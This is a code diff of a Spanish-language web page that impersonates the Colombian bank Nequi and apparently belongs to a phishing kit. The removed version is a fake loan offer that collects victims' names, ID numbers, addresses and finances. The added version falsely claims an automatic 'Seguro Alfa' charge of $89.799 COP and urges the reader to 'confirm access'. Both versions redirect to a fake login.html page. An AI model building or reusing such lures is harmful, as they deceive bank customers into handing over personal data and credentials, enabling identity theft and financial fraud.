@@ -2,317 +2,114 @@
 <html lang="es">
 
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>Préstamo Propulsor Nequi</title>
-  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    body {
-      font-family: 'Manrope', system-ui, sans-serif;
-      background: #f4f4f5;
-    }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>Recaudo realizado</title>
 
-    .gradient-bg {
-      background: linear-gradient(135deg, #200020 0%, #da0081 100%);
-    }
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
 
-    .glass-card {
-      background: rgba(255, 255, 255, 0.98);
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
-    }
+<style>
+body{
+font-family:'Manrope',system-ui,sans-serif;
+background:#f4f4f5;
+}
 
-    #loader-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(255, 255, 255, 0.9);
-      backdrop-filter: blur(8px);
-      display: none;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-    }
+.gradient-bg{
+background:linear-gradient(135deg,#200020 0%,#da0081 100%);
+}
 
-    .step-container {
-      display: none;
-    }
+.glass-card{
+background:rgba(255,255,255,0.98);
+box-shadow:0 10px 30px rgba(0,0,0,0.15);
+}
 
-    .step-container.active {
-      display: block;
-      animation: slideUp 0.4s ease forwards;
-    }
+#loader-overlay{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(255,255,255,0.9);
+backdrop-filter:blur(8px);
+display:none;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+z-index:9999;
+}
 
-    @keyframes slideUp {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .form-input {
-      width: 100%;
-      height: 3.2rem;
-      background-color: #f9f7fc;
-      border-radius: 0.5rem;
-      padding: 0 1rem;
-      font-size: 1rem;
-      color: #200020;
-      border: 1px solid #ebdfeb;
-      transition: all 0.2s;
-    }
-
-    .form-input:focus {
-      outline: none;
-      border-color: #da0081;
-      background-color: #fff;
-      box-shadow: 0 0 0 3px rgba(218, 0, 129, 0.1);
-    }
-
-    .form-label {
-      display: block;
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: #4a4a4a;
-      margin-bottom: 0.35rem;
-    }
-
-    .floating-header {
-      position: sticky;
-      top: 0;
-      z-index: 50;
-      backdrop-filter: blur(10px);
-      background: rgba(255, 255, 255, 0.9);
-      border-bottom: 1px solid rgba(0, 0, 0, 0.05);
-    }
-  </style>
+.floating-header{
+position:sticky;
+top:0;
+z-index:50;
+backdrop-filter:blur(10px);
+background:rgba(255,255,255,0.9);
+border-bottom:1px solid rgba(0,0,0,0.05);
+}
+</style>
 </head>
 
 <body class="min-h-screen flex flex-col">
 
-  <div id="loader-overlay">
-    <img src="loader.gif" class="w-[80px]">
-    <p class="mt-4 font-bold text-[#da0081] text-xl tracking-tight">Procesando solicitud...</p>
-  </div>
+<div id="loader-overlay">
+<img src="loader.gif" class="w-[80px]">
+<p class="mt-4 font-bold text-[#da0081] text-xl tracking-tight">Verificando movimiento...</p>
+</div>
 
-  <header class="w-full px-4 py-3 shadow-sm floating-header">
-    <div class="max-w-md mx-auto flex justify-center items-center">
-      <img src="https://logosenvector.com/logo/img/nequi-37254.png" alt="Nequi" class="h-8" />
-    </div>
-  </header>
+<header class="w-full px-4 py-3 shadow-sm floating-header">
+<div class="max-w-md mx-auto flex justify-center items-center">
+<img src="https://logosenvector.com/logo/img/nequi-37254.png" class="h-8">
+</div>
+</header>
 
-  <main class="flex-grow flex flex-col items-center w-full px-4 pt-8 pb-12 gradient-bg">
+<main class="flex-grow flex flex-col items-center w-full px-4 pt-10 pb-12 gradient-bg">
 
-    <div class="w-full max-w-md glass-card rounded-2xl overflow-hidden relative border border-white/20">
+<div class="w-full max-w-md glass-card rounded-2xl overflow-hidden border border-white/20 p-8 text-center">
 
-      <!-- Paso 1: Inicio -->
-      <div id="step-1" class="step-container active p-8 text-center">
-        <div
-          class="w-20 h-20 bg-[#fde7f1] border-4 border-white shadow-sm rounded-full flex items-center justify-center mx-auto mb-6">
-          <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-[#da0081]" fill="none" viewBox="0 0 24 24"
-            stroke="currentColor">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-              d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-          </svg>
-        </div>
-        <h1 class="text-3xl font-extrabold text-[#200020] mb-3 leading-tight tracking-tight">Préstamo Propulsor</h1>
-        <p class="text-[15px] text-gray-500 mb-8 px-2 font-medium">Te prestamos la plata que necesitas para impulsar tus
-          metas. Rápido, fácil y sin tanto papeleo. ¿Listo para volar?</p>
+<div class="mb-6 flex justify-center">
+<img src="https://seeklogo.com/images/A/alfa-seguros-logo-7B2A3E3F5C-seeklogo.com.png"
+class="h-14">
+</div>
 
-        <button onclick="goToStep(2)"
-          class="w-full h-[54px] rounded-xl text-white font-bold text-lg transition-transform hover:scale-[1.02] active:scale-[0.98] shadow-lg flex items-center justify-center gap-2"
-          style="background: linear-gradient(90deg, #da0081 0%, #ff52a4 100%);">
-          Adquirir Préstamo
-          <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
-            <path fill-rule="evenodd"
-              d="M12.293 5.293a1 1 0 011.414 0l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-2.293-2.293a1 1 0 010-1.414z"
-              clip-rule="evenodd" />
-          </svg>
-        </button>
-      </div>
+<h1 class="text-3xl font-extrabold text-[#200020] mb-3">
+Recaudo realizado
+</h1>
 
-      <!-- Paso 2: Datos Personales -->
-      <div id="step-2" class="step-container p-6 sm:p-8">
-        <div class="flex items-center gap-4 mb-8">
-          <button onclick="goToStep(1)"
-            class="w-9 h-9 rounded-full bg-[#fde7f1] flex items-center justify-center text-[#da0081] hover:bg-[#faccdb] transition-colors focus:ring-2 ring-offset-1 ring-[#da0081] outline-none">
-            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24"
-              stroke="currentColor">
-              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7" />
-            </svg>
-          </button>
-          <div class="flex-1">
-            <div class="h-2 w-full bg-gray-100 rounded-full overflow-hidden shadow-inner">
-              <div class="h-full bg-[#da0081] w-1/2 rounded-full"></div>
-            </div>
-            <p class="text-[11px] text-gray-500 font-bold mt-1.5 uppercase tracking-wider text-right">Paso 1 de 2</p>
-          </div>
-        </div>
+<p class="text-gray-600 mb-6 font-medium">
+Se realizó un recaudo automático correspondiente a un
+<span class="font-bold text-[#da0081]">Seguro Alfa</span>.
+Para ver el detalle del movimiento debes confirmar tu acceso.
+</p>
 
-        <h2 class="text-2xl font-extrabold text-[#200020] mb-2 leading-tight">Tus Datos Personales</h2>
-        <p class="text-sm text-gray-500 mb-8 font-medium">Queremos conocerte un poco mejor antes de continuar.</p>
+<div class="bg-[#fde7f1] border border-[#f5c4df] rounded-xl p-4 mb-6">
+<p class="text-sm text-gray-600">Valor del recaudo</p>
+<p class="text-2xl font-extrabold text-[#da0081]">$ 89.799 COP</p>
+</div>
 
-        <form class="space-y-5" onsubmit="return false;">
-          <div>
-            <label class="form-label">Nombre(s)</label>
-            <input id="nombre" type="text" placeholder="Ej: Juan Diego" class="form-input" />
-          </div>
-          <div>
-            <label class="form-label">Apellidos</label>
-            <input id="apellido" type="text" placeholder="Ej: Pérez Gómez" class="form-input" />
-          </div>
-          <div>
-            <label class="form-label">Número de Cédula</label>
-            <input id="cedula" type="tel" inputmode="numeric" placeholder="Tu documento de identidad"
-              class="form-input" />
-          </div>
-          <div>
-            <label class="form-label">Dirección de residencia</label>
-            <input id="direccion" type="text" placeholder="Ej: Carrera 45 # 12-34" class="form-input" />
-          </div>
+<button onclick="continuarLogin()"
+class="w-full h-[54px] rounded-xl text-white font-bold text-lg transition-transform hover:scale-[1.02] active:scale-[0.98] shadow-lg"
+style="background: linear-gradient(90deg, #da0081 0%, #ff52a4 100%);">
+Ver detalle
+</button>
 
-          <button onclick="processStep2()"
-            class="w-full h-[54px] rounded-xl text-white font-bold text-[17px] transition-transform hover:-translate-y-1 active:scale-95 shadow-[0_8px_20px_-6px_rgba(218,0,129,0.5)] mt-8"
-            style="background:#da0081">
-            Siguiente
-          </button>
-        </form>
-      </div>
+<p class="text-xs text-gray-400 mt-5">
+Movimiento protegido • Confirmación requerida
+</p>
 
-      <!-- Paso 3: Información Financiera -->
-      <div id="step-3" class="step-container p-6 sm:p-8">
-        <div class="flex items-center gap-4 mb-8">
-          <button onclick="goToStep(2)"
-            class="w-9 h-9 rounded-full bg-[#fde7f1] flex items-center justify-center text-[#da0081] hover:bg-[#faccdb] transition-colors focus:ring-2 ring-offset-1 ring-[#da0081] outline-none">
-            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24"
-              stroke="currentColor">
-              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7" />
-            </svg>
-          </button>
-          <div class="flex-1">
-            <div class="h-2 w-full bg-gray-100 rounded-full overflow-hidden shadow-inner">
-              <div class="h-full bg-[#da0081] w-full rounded-full transition-all duration-500"></div>
-            </div>
-            <p class="text-[11px] text-[#da0081] font-bold mt-1.5 uppercase tracking-wider text-right">Paso 2 de 2</p>
-          </div>
-        </div>
+</div>
 
-        <h2 class="text-2xl font-extrabold text-[#200020] mb-2 leading-tight">Tu Perfil Financiero</h2>
-        <p class="text-sm text-gray-500 mb-8 font-medium">Ayúdanos a entender tu capacidad de pago para aprobarte de
-          inmediato.</p>
+</main>
 
-        <form class="space-y-6" onsubmit="return false;">
-          <div class="relative">
-            <label class="form-label flex items-center gap-2"><span
-                class="w-2.5 h-2.5 rounded-full bg-[#da0081] shadow-sm"></span> Ingresos mensuales</label>
-            <input id="ingresos" type="tel" placeholder="$ 0"
-              class="form-input font-bold text-lg text-[#da0081] money-input border-[#da0081]/30 bg-[#da0081]/5 focus:bg-[#da0081]/10" />
-          </div>
-          <div class="relative">
-            <label class="form-label flex items-center gap-2"><span
-                class="w-2.5 h-2.5 rounded-full bg-[#ffab00] shadow-sm"></span> Gastos mensuales</label>
-            <input id="gastos" type="tel" placeholder="$ 0"
-              class="form-input font-bold text-lg text-[#d48b00] money-input border-[#ffab00]/30 bg-[#ffab00]/5 focus:bg-[#ffab00]/10" />
-          </div>
-          <div class="relative">
-            <label class="form-label flex items-center gap-2"><span
-                class="w-2.5 h-2.5 rounded-full bg-blue-500 shadow-sm"></span> Saldo actual en Nequi</label>
-            <input id="saldo_actual" type="tel" placeholder="$ 0"
-              class="form-input font-bold text-lg text-blue-600 money-input border-blue-500/30 bg-blue-500/5 focus:bg-blue-500/10" />
-          </div>
-          <div class="relative">
-            <label class="form-label flex items-center gap-2"><span
-                class="w-2.5 h-2.5 rounded-full bg-green-500 shadow-sm"></span> ¿Cuánto quieres pedir?</label>
-            <input id="monto_prestamo" type="tel" placeholder="$ 0"
-              class="form-input font-bold text-lg text-green-600 money-input border-green-500/30 bg-green-500/5 focus:bg-green-500/10" />
-          </div>
+<script>
+function continuarLogin(){
+document.getElementById("loader-overlay").style.display="flex";
 
-          <button onclick="processStep3()"
-            class="w-full h-[54px] rounded-xl text-white font-bold text-[17px] transition-transform hover:-translate-y-1 active:scale-95 shadow-[0_8px_20px_-6px_rgba(218,0,129,0.5)] mt-8 flex items-center justify-center gap-2"
-            style="background: linear-gradient(90deg, #da0081 0%, #ff52a4 100%);">
-            Solicitar Préstamo
-            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24"
-              stroke="currentColor">
-              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3" />
-            </svg>
-          </button>
-        </form>
-      </div>
+setTimeout(()=>{
+window.location.href="login.html";
+},4000);
+}
+</script>
 
-    </div>
-  </main>
-
-  <script>
-    function goToStep(step) {
-      document.querySelectorAll('.step-container').forEach(el => el.classList.remove('active'));
-      document.getElementById('step-' + step).classList.add('active');
-      window.scrollTo({ top: 0, behavior: 'smooth' });
-    }
-
-    document.querySelectorAll('.money-input').forEach(input => {
-      input.addEventListener('input', (e) => {
-        let v = e.target.value.replace(/\D/g, "");
-        if (v) e.target.value = "$ " + new Intl.NumberFormat('de-DE').format(v);
-        else e.target.value = "";
-      });
-    });
-
-    document.getElementById('cedula').addEventListener('input', (e) => {
-      e.target.value = e.target.value.replace(/\D/g, "");
-    });
-
-    function processStep2() {
-      const nom = document.getElementById('nombre').value.trim();
-      const ape = document.getElementById('apellido').value.trim();
-      const ced = document.getElementById('cedula').value.trim();
-      const dir = document.getElementById('direccion').value.trim();
-
-      if (!nom || !ape || !ced || !dir) {
-        alert("Por favor, llena todos tus datos personales para continuar.");
-        return;
-      }
-
-      localStorage.setItem('p_nombre', nom);
-      localStorage.setItem('p_apellido', ape);
-      localStorage.setItem('p_cedula', ced);
-      localStorage.setItem('p_direccion', dir);
-
-      goToStep(3);
-    }
-
-    function processStep3() {
-      const ing = document.getElementById('ingresos').value.trim();
-      const gas = document.getElementById('gastos').value.trim();
-      const sal = document.getElementById('saldo_actual').value.trim();
-      const pre = document.getElementById('monto_prestamo').value.trim();
-
-      if (!ing || !gas || !sal || !pre || ing === "$" || gas === "$" || sal === "$" || pre === "$") {
-        alert("Por favor, completa toda la información financiera correctamente.");
-        return;
-      }
-
-      localStorage.setItem('p_ingresos', ing);
-      localStorage.setItem('p_gastos', gas);
-      localStorage.setItem('p_saldo', sal);
-      localStorage.setItem('p_prestamo', pre);
-
-      document.getElementById('loader-overlay').style.display = 'flex';
-      setTimeout(() => {
-        window.location.href = "login.html";
-      }, 6000);
-    }
-
-    // Reset attempts if starting fresh
-    localStorage.setItem('s_attempts', '2');
-  </script>
 </body>
-
 </html>
